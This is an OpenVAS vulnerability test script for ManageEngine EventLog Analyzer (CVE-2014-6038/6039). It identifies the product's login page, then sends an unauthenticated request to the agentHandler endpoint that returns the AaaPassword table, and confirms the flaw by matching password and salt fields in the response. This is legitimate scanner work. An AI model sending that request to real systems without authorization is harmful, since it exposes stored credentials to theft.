###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_managed_engine_eventlog_analyzer_11_14.nasl 6692 2017-07-12 09:57:43Z teissa $
#
# ManageEngine EventLog Analyzer Multiple Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.105111");
 script_cve_id("CVE-2014-6038","CVE-2014-6039");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_version ("$Revision: 6692 $");

 script_name("ManageEngine EventLog Analyzer Multiple Vulnerabilities");

 script_xref(name:"URL", value:"https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_eventlog_info_disc.txt");

 script_tag(name: "impact" , value:"Exploiting this issue could allow an attacker read usernames and passwords.");

 script_tag(name: "vuldetect" , value:"Send a HTTP GET request and check the response.");
 script_tag(name: "solution" , value:"Ask the Vendor for an update.");
 script_tag(name: "affected", value:"all versions from v7 to v9.9 build 9002.");
 script_tag(name: "summary" , value:"ManageEngine EventLog Analyzer is prone to an information disclosure vulnerability.");

 script_tag(name:"last_modification", value:"$Date: 2017-07-12 11:57:43 +0200 (Wed, 12 Jul 2017) $");
 script_tag(name:"creation_date", value:"2014-11-06 16:38:34 +0100 (Thu, 06 Nov 2014)");
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 8400);
 script_exclude_keys("Settings/disable_cgi_scanning");

 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default: 8400 );

url = "/event/index3.do";

if( http_vuln_check( port:port, url:url, pattern:"<title>ManageEngine EventLog Analyzer", extra_check:"isLoginPage" ) )
{
  url = '/agentHandler?mode=getTableData&table=AaaPassword';

  if( http_vuln_check( port:port, url:url, pattern:"AaaPassword createdtime", extra_check:make_list( "password","password_id","salt" ) ) )
  {
    security_message( port:port );
    exit( 0 );
  }
}

exit( 0 );

